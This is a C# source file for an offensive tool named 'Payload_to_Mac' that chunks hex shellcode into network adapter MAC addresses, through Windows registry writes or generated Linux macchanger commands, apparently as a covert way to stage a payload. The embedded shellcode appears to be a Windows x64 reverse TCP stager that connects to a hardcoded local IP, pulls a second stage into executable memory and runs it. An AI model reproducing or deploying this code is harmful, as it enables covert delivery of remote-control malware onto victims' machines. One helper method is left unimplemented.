using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using System.Management.Instrumentation;
using System.Management;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace Payload_to_Mac
{
    class Program
    {
        static string payload = "fc4883e4f0e8cc0000004151415052"
           + "51564831d265488b5260488b521848"
           + "8b5220488b7250480fb74a4a4d31c9"
           + "4831c0ac3c617c022c2041c1c90d41"
           + "01c1e2ed524151488b52208b423c48"
           + "01d0668178180b020f85720000008b"
           + "80880000004885c074674801d0508b"
           + "4818448b40204901d0e35648ffc941"
           + "8b34884801d64d31c94831c0ac41c1"
           + "c90d4101c138e075f14c034c240845"
           + "39d175d858448b40244901d066418b"
           + "0c48448b401c4901d0418b04884801"
           + "d0415841585e595a41584159415a48"
           + "83ec204152ffe05841595a488b12e9"
           + "4bffffff5d49be7773325f33320000"
           + "41564989e64881eca00100004989e5"
           + "49bc0200115cc0a8013241544989e4"
           + "4c89f141ba4c772607ffd54c89ea68"
           + "010100005941ba29806b00ffd56a05"
           + "415e50504d31c94d31c048ffc04889"
           + "c248ffc04889c141baea0fdfe0ffd5"
           + "4889c76a1041584c89e24889f941ba"
           + "99a57461ffd585c0740a49ffce75e5"
           + "e8930000004883ec104889e24d31c9"
           + "6a0441584889f941ba02d9c85fffd5"
           + "83f8007e554883c4205e89f66a4041"
           + "59680010000041584889f24831c941"
           + "ba58a453e5ffd54889c34989c74d31"
           + "c94989f04889da4889f941ba02d9c8"
           + "5fffd583f8007d2858415759680040"
           + "000041586a005a41ba0b2f0f30ffd5"
           + "575941ba756e4d61ffd549ffcee93c"
           + "ffffff4801c34829c64885f675b441"
           + "ffe7586a005949c7c2f0b5a256ffd5";
        static void Main(string[] args)
        {
            try
            {


                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Payload_to_Mac v1.0 Tool (MacChanger) ");
                Console.WriteLine("Published by Damon Mohammadbagher");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("Warning : You should RunAs Administrator this tool for changing Mac Address");
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("Warning : this code tested with Win7x64-SP1");
                Console.WriteLine("Warning : Win8 , Win10 Not Tested ;)");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Step I  syntax 0 : Payload_to_Mac.exe null");
                Console.WriteLine("Step I  syntax 1 (Windows) : Payload_to_Mac.exe null \"PAYLOAD\" ");
                Console.WriteLine("Step I  Example 1: Payload_to_Mac.exe null \"5fffd583f8007d2858415759680040\" ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Step I  syntax 0 : Payload_to_Mac.exe lin");
                Console.WriteLine("Step I  syntax 1 (Linux) : Payload_to_Mac.exe lin \"PAYLOAD\" ");
                Console.WriteLine("Step I  Example 1: Payload_to_Mac.exe lin \"5fffd583f8007d2858415759680040\" ");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("Step II syntax 2 : Payload_to_Mac.exe Regkey_Parent  [00+Payload] \"Connection Name\" ");
                Console.WriteLine("Step II Example 2: Payload_to_Mac.exe 0007  005fffd583f8 \"Local Area Connection\" ");
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine(@"Check your Parent Regkey in this address: ");
                Console.WriteLine(@"SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\");
                Console.ForegroundColor = ConsoleColor.Gray;




                if (args.Length >= 1 && (args[0].ToUpper() == "NULL" || args[0].ToUpper()=="LIN") )
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine();
                    if (args[0].ToUpper() == "NULL")
                    {
                        Console.WriteLine("Copy these lines to one BAT file ;)");
                        Console.WriteLine("You should RunAs Administrator this BAT file");
                        Console.WriteLine();
                    }
                    else if (args[0].ToUpper() == "LIN")
                    {
                        Console.WriteLine("Copy these lines to one Bash Script file for Linux ;)");
                        Console.WriteLine();
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.WriteLine(" #!/bin/bash");
                        Console.WriteLine("sudo ifconfig eth0 down; sudo macchanger -m  " + "00:ff:00:ff:00:ff" + " eth0; sudo ifconfig eth0 up; sleep 10;");

                    }
                    
                    Console.ForegroundColor = ConsoleColor.Gray;
                    if (args.Length >= 2 && args[1] != null) { payload = args[1].ToString(); }
                    int b = 0;
                    string temp = "";
                    string temp_mac_addresses = "";
                  
                    foreach (char item in payload)
                    {
                        temp += item;
                        b++;
                        if (b >= 10)
                        {
                            if (args[0].ToUpper() == "NULL")
                                Console.Write("Payload_to_Mac.exe " + "0007" + " " + "00" + temp + " \"Local Network Connection\"");
                            if (args[0].ToUpper() == "LIN")
                            {
                                /// 00:48:31:c0:ac:3c ==> "00" + 48:31:c0:ac:3c
                                for (int i = 0; i < 10;)
                                {
                                    temp_mac_addresses += temp.Substring(i, 2) + ":";
                                    i++;
                                    i++;
                                }                                
                                Console.Write("sudo ifconfig eth0 down; sudo macchanger -m  " + "00:" + temp_mac_addresses.Substring(0,temp_mac_addresses.Length-1) + " eth0; sudo ifconfig eth0 up; sleep 10;");
                            }
                            Console.WriteLine(""); b = 0;
                            temp = "";
                            temp_mac_addresses = "";
                        }

                    }
                    if (args[0].ToUpper() == "LIN")
                        Console.WriteLine("sudo ifconfig eth0 down; sudo macchanger -m  " + "00:ff:ff:ff:ff:ff" + " eth0; sudo ifconfig eth0 up; sleep 10;");

                    Console.WriteLine("");
                    Console.WriteLine("rem PAYLOAD : " + payload);
                }
                else if (args.Length >= 1)
                {
                    string __RegkeyParentkeyNumber = "0007";
                    string NIC_Name = "Local Network Connection";
                    NIC_Name = args[2].ToString();
                    __RegkeyParentkeyNumber = args[0].ToString();
                    string regkeyadd = args[1].ToString();

                    Console.ForegroundColor = ConsoleColor.DarkGreen;
                    Console.WriteLine("Disable NIC ");
                    SelectQuery wmiQuery = new SelectQuery("SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionId != NULL");
                    ManagementObjectSearcher searchProcedure = new ManagementObjectSearcher(wmiQuery);
                    foreach (ManagementObject item in searchProcedure.Get())
                    {
                        if (((string)item["NetConnectionId"]) == NIC_Name)
                        {
                            item.InvokeMethod("Disable", null);
                        }
                    }
                    Console.ForegroundColor = ConsoleColor.DarkGreen;
                    Console.WriteLine("Set Payload to mac ");
                    RegistryKey rkey;
                    /// for win10 i think this regkey "RKEY" address should be CHANGE ;-/
                    /// this code tested with win7x64-sp1
                    rkey = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\" + __RegkeyParentkeyNumber);

                    rkey.SetValue("NetworkAddress", regkeyadd);
                    System.Threading.Thread.Sleep(6000);
                    Console.WriteLine("Enable NIC ");
                    SelectQuery wmiQuery2 = new SelectQuery("SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionId != NULL");
                    ManagementObjectSearcher searchProcedure2 = new ManagementObjectSearcher(wmiQuery2);
                    foreach (ManagementObject item in searchProcedure2.Get())
                    {
                        if (((string)item["NetConnectionId"]) == NIC_Name)
                        {
                            item.InvokeMethod("Enable", null);
                        }
                    }
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("Mac Set : {0}", regkeyadd);
                    Console.ForegroundColor = ConsoleColor.DarkGreen;
                    System.Threading.Thread.Sleep(10000);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Error 1: {0}", e.Message);

            }

        }
        private const string baseReg = @"SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002bE10318}\";

        public static bool SetMAC(string nicid, string newmac)
        {
            bool ret = false;
            using (RegistryKey bkey = GetBaseKey())
            using (RegistryKey key = bkey.OpenSubKey(baseReg + nicid))
            {
                if (key != null)
                {
                    key.SetValue("NetworkAddress", newmac, RegistryValueKind.String);

                    ManagementObjectSearcher mos = new ManagementObjectSearcher(
                        new SelectQuery("SELECT * FROM Win32_NetworkAdapter WHERE Index = " + nicid));

                    foreach (ManagementObject o in mos.Get().OfType<ManagementObject>())
                    {
                        o.InvokeMethod("Disable", null);
                        o.InvokeMethod("Enable", null);
                        ret = true;
                    }
                }
            }

            return ret;
        }

       

        private static RegistryKey GetBaseKey()
        {
            throw new NotImplementedException();
        }

       
    }
}
